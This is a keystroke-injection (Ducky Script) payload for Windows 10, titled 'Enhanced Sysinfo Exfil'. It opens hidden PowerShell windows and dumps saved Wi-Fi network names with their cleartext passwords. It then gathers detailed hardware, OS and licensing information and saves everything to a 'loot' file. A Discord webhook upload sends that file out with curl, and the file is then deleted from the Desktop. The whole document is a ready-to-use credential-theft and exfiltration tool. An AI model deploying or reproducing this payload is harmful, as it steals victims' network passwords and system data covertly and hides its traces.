REM Title: Enhanced Sysinfo Exfil
REM Author: LulzAnarchyAnon
REM Description: Gather enhanced system info using powershell, Ducky script and notepad. First hidden powershell is 
REM opened, and a script is ran to collect the target computers enhanced system information, Then a bit
of Ducky script runs saving the exfilled info to a notepad txt file on the Desktop.
REM It is then exfiltrated using a Discord webhook, and finally the txt file is removed from the Desktop
REM Target: Windows 10 
REM Props: 
REM Version: 1.0nhanced Sysinfo Exfil
REM Category: Exfiltration


GUI r
DELAY 200
STRING powershell -windowstyle hidden  
DELAY 200
ENTER
DELAY 500
STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize 
DELAY 500
ENTER
DELAY 200
STRING Get-ComputerInfo
DELAY 200
ENTER
DELAY 200
STRING $os = Get-CimInstance -ClassName CIM_OperatingSystem
DELAY 200
ENTER
STRING $os | Select-Object Caption, Version, OSArchitecture, BuildNumber
DELAY 200
ENTER
DELAY 200
STRING $processor = Get-CimInstance -ClassName CIM_Processor
DELAY 200
ENTER
STRING $processor | Select-Object Name, MaxClockSpeed
DELAY 200
ENTER
STRING $memory = Get-CimInstance -ClassName CIM_PhysicalMemory
DELAY 200
ENTER
STRING $memory | Select-Object Capacity, Speed
DELAY 200
ENTER
STRING $diskDrives = Get-CimInstance -ClassName CIM_DiskDrive
DELAY 200
ENTER
STRING $diskDrives | Select-Object Model, MediaType, Size
DELAY 200
ENTER
STRING $logicalDisks = Get-CimInstance -ClassName CIM_LogicalDisk
DELAY 200
ENTER
STRING $logicalDisks | Select-Object DeviceID, FileSystem, Size, FreeSpace
DELAY 200
ENTER
STRING $networkAdapters = Get-CimInstance -ClassName CIM_NetworkAdapter
DELAY 200
ENTER
STRING $networkAdapters | Select-Object Name, MACAddress, Speed
DELAY 200
ENTER
STRING $bios = Get-CimInstance -ClassName CIM_BIOSElement
DELAY 200
ENTER
STRING $bios | Select-Object Manufacturer, Version, ReleaseDate
DELAY 200
ENTER
STRING $battery = Get-CimInstance -ClassName CIM_Battery
DELAY 200
ENTER
STRING $battery | Select-Object EstimatedChargeRemaining, EstimatedRunTime
DELAY 200
ENTER
STRING $graphics = Get-CimInstance -ClassName CIM_VideoController
DELAY 200
ENTER
STRING $graphics | Select-Object Name, AdapterRAM, DriverVersion
DELAY 200
ENTER
STRING Get-WmiObject -query 'select * from SoftwareLicensingService'
DELAY 1000
ENTER
DELAY 1000
ALT SPACE
DELAY 1000
STRING e
DELAY 1000
STRING s
DELAY 1000
CTRL c
DELAY 200
STRING exit
DELAY 1000
ENTER
DELAY 2000
GUI r
DELAY 200
GUI r
DELAY 200
STRING notepad 
DELAY 200
ENTER
DELAY 200
CTRL v
DELAY 100
ALT f
DELAY 100
STRING s
DELAY 100
STRING loot
DELAY 200
ENTER
DEALY 100
ALT F4
DELAY 100
ENTER
DELAY 2000
GUI r
DELAY 200
STRING powershell -windowstyle hidden 
DELAY 200
ENTER
DELAY 200
STRING function Upload-Discord {
DELAY 500
ENTER
DELAY 200
STRING [CmdletBinding()]
DELAY 500
ENTER
DELAY 200
STRING param (
DELAY 500
ENTER
DELAY 200
STRING [parameter(Position=0,Mandatory=$False)]
DELAY 500
ENTER
DELAY 200
STRING [string]$file,
DELAY 500
ENTER
DELAY 200
STRING [parameter(Position=1,Mandatory=$False)]
DELAY 500
ENTER
DELAY 200
STRING [string]$text 
DELAY 500
ENTER
DELAY 200
STRING )
DELAY 500
ENTER
DELAY 200
STRING $hookurl = 'DISCORD WEBHOOK HERE'
DELAY 500
ENTER
DELAY 200
STRING $Body = @{
DELAY 500
ENTER
DELAY 200
STRING 'username' = $env:DISCORD NAME HERE
DELAY 500
ENTER
DELAY 200
STRING 'content' = $text
DELAY 500
ENTER
DELAY 200
STRING }
DELAY 500
ENTER
DELAY 200
STRING if (-not ([string]::IsNullOrEmpty($text))){
DELAY 500
ENTER
DELAY 200
STRING Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body |  ConvertTo-Json)};
DELAY 500
ENTER
DELAY 200
STRING curl.exe -F "file1=@$file" $hookurl
DELAY 200
ENTER
DELAY 200
STRING if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
DELAY 500
ENTER
DELAY 200
STRING }
DELAY 200
ENTER
DELAY 200
STRING Upload-Discord -file "C:\Users\NAME\NAME\Desktop\loot.txt"
DELAY 200
ENTER
DELAY 1000
STRING exit
ENTER
DELAY 2000
GUI r
DELAY 200
STRING powershell -windowstyle hidden  
DELAY 200
ENTER
DELAY 500
STRING Remove-Item "C:\Users\march\OneDrive\Desktop\loot.txt"
DELAY 500
ENTER
